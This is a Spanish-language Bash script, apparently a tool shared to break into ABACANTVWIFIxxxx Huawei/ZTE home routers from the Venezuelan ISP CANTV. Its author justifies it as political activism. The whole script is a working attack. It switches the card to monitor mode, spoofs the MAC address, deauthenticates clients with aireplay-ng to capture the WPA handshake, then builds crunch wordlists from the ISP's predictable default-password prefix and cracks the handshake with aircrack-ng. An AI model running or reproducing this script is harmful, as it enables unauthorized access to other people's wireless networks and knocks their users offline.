#!/bin/bash
#0DAY para Routers Huawei Inc. Zte de ABA Cantv.

# Este script hace uso de las contraseñas
# por defecto en los routers ABACANTVWIFIxxxx Huawei Inc.
# Escrito por @NyxZ3n, me hago responsable del uso del mismo
# Pues ante la dictadura, yo también soy responsable de hacer
# un cambio por el país. NO A LA DESINFORMACIÓN, 
# DEBEMOS ESTAR COMUNICADOS SIEMPRE.
# CharsetDiccionario = 85047928%%%%%% ó 8504792%%%%%%%



echo "¡ADVERTENCIA! Necesitas ser usuario root(superusuario) para correr el script"
sleep 3

HANDSHAKE="HandShake.cap"

clear
echo "------------------------------------------------"
echo "                Script by @NyxZ3n               "
echo "                                                "
echo "   BruteForce a contraseñas predeterminadas en  "
echo "   routers ABACANTVWIFIxxxx                     "
echo "------------------------------------------------"
echo ""
echo "========Presiona enter para continuar========"
read EMPEZAR
if [[ $EMPEZAR == "" ]]; then
clear
fi

echo "----------------------------------------------------"
echo "-Empezar modo monitor en la interfaz wireless[s/n]?-"
echo "----------------------------------------------------"
echo ""
read MONIF

if [[ $MONIF == 's' ]]; then
echo ""
echo "Terminando procesos que pudiesen interferir"
echo ""
echo ""
sudo service networking stop
sudo service network-manager stop
iwconfig
echo ""
echo "Selecciona tarjeta wireless impresa arriba:"
echo ""
read WIRELESS
[[ $WIRELESS == "" ]]
clear
echo "Empezando modo monitor con $WIRELESS..."
echo ""
echo ""
sleep 1
echo "Perderá su conexión previa durante el ataque."
sudo ifconfig $WIRELESS down
sudo iwconfig $WIRELESS mode monitor
sudo ifconfig $WIRELESS up
sleep 3
clear
else
echo ""
echo "No hay nada que hacer."
exit
sleep 2
clear
fi

echo "----------------------------------------"
echo "-    Desea hacer MAC Spoofing [s/n]?   -"
echo "----------------------------------------"
echo ""
read MACSPF

if [[ $MACSPF == 's' ]]; then
echo ""
echo "Apagando interfaces Wireless"
echo ""
sleep 2
sudo ifconfig $WIRELESS down
echo "Cambiando a MAC randomizada"
echo ""
sudo macchanger -r $WIRELESS 
echo ""
echo "Levantando interfaz Spoofeada"
echo ""
sleep 2
clear
sudo ifconfig $WIRELESS up
else
echo ""
echo "Ignorando"
sleep 1
clear
fi


echo "----------------------------------------------------------------"
echo "-  Verificar routers en el perimetro[s/n]? (n Si ya realizado) -"
echo "----------------------------------------------------------------"
echo ""
read DUMP
if [[ $DUMP == 's' ]]; then
echo ""
echo "Al encontrar la red, presione CTRL + C."
echo ""
echo "Routers: ABACANTVWIFIxxxx"
echo "Manufacturer: Huawei Inc. ó ZTE"
sleep 4
sudo airodump-ng $WIRELESS --manufacturer
else
sleep 2
clear
fi

while true
do
echo "---------------------------------------------------------"
echo "-       Capturar el Handshake[s/n]? (n Si ya realizado) -"
echo "---------------------------------------------------------"
echo ""
read HANDC

if [[ $HANDC == 's' ]]; then
sleep 4
echo ""
echo "Ingrese BSSID de la red (EJ: A1:F3:45:12:34:90):  "
echo ""
read BSSID
[[ $BSSID == "" ]]
echo ""
echo "Ingrese el channel de la red [1-14]:"
echo ""
read CHNEL
[[ $CHNEL == "" ]]
echo ""
echo "-------------------------------------------------------------------"
echo "-Tiempo para captura de HandShake en segundos:  (120 recomendado)-"
echo "-------------------------------------------------------------------"
echo ""
read TIEMPO1
TIEMPO3=$(($TIEMPO1 + 2))
SEGUNDOS='s'
TIEMPO2=$TIEMPO1$SEGUNDOS
sleep 2
clear
timeout $TIEMPO2 airodump-ng --ig -w HandShake -c $CHNEL --bssid $BSSID $WIRELESS --manufacturer & timeout $TIEMPO2 xterm -hold -e "while true; do sleep 5; sudo aireplay-ng -0 5 -q 2 --ig -a $BSSID $WIRELESS; done" & sleep $TIEMPO3; kill $!
echo ""
echo ""
echo ""
echo "Presiona enter."
clear
echo ""
sudo mv HandShake*.cap HandShake.cap
sudo rm HandShake*.csv
sudo rm HandShake*.kismet.*
clear
else
sleep 1
clear
fi

echo "-----------------------------------------------------------------------"
echo "-                     Handshake Capturado[s/n]?                       -"
echo "-----------------------------------------------------------------------"
read SI
if [[ $SI == 's' ]]; then
clear
echo ""
sleep 2
break
fi

done
echo "-----------------------------------------------------------------------"
echo "-    Desea devolver la interfaz $WIRELESS a su modo normal[s/n]?-      "
echo "-----------------------------------------------------------------------"
echo ""
read RESTOR

if [[ $RESTOR == "s" ]]; then
echo ""
echo "Desactivando modo monitor"
sudo ifconfig $WIRELESS down
sudo iwconfig $WIRELESS mode managed
echo "Apagando interfaz"
echo ""
echo "Restaurando MAC original"
echo ""
sleep 1
sudo macchanger -p $WIRELESS
echo ""
echo "Levantando interfaz $WIRELESS"
echo ""
sleep 1
sudo ifconfig $WIRELESS up
echo "Interfaz $WIRELESS restaurada"
echo ""
echo "Devolviendo Network manager y networking"
sudo service network-manager start
sudo service networking start
clear
else
echo ""
echo "NO A LA DESINFORMACIÓN/DESCOMUNICACIÓN"
sleep 1
clear
fi

while true
do
clear
echo "-------------------- Seleccione ---------------------"
echo "--                                                 --"
echo "-- 1. Ver handshakes             (Ctrl-C to exit  )--"
echo "-- 2. Charset:85047928%%%%%%     (10 minutos aprox)--"
echo "-- 3. Charset:8504792%%%%%%%     (1hora aprox     )--"
echo "--                                                 --"
echo "-----------------------------------------------------"
echo ""

read n
case $n in
1)(xterm -hold -e sudo aircrack-ng $HANDSHAKE) & ;;

2)clear
echo "Empezando fuerzabruta de 6 dígitos numéricos."
echo ""
echo "Por favor ingrese un nombre para el diccionario:"
echo ""
read DICCIONARIO
echo ""
crunch 14 14 -t 85047928%%%%%% -o $DICCIONARIO
echo ""
sudo aircrack-ng -w $DICCIONARIO $HANDSHAKE
echo ""
read -p "Presione cualquier tecla para volver.";;

3)clear
echo "Empezando fuerzabruta de 7 dígitos numéricos."
echo ""
echo "Por favor ingrese un nombre para el diccionario:"
echo ""
read DICCIONARIO2
echo ""
crunch 14 14 -t 8504792%%%%%%% -o $DICCIONARIO2
echo""
sudo aircrack-ng -w $DICCIONARIO2 $HANDSHAKE
echo ""
read -p "Presione cualquier tecla para volver.";;

*)clear
echo "Opción inválida"
echo ""
read -p "Presione cualquier tecla para volver.";;

esac
sleep 1
done
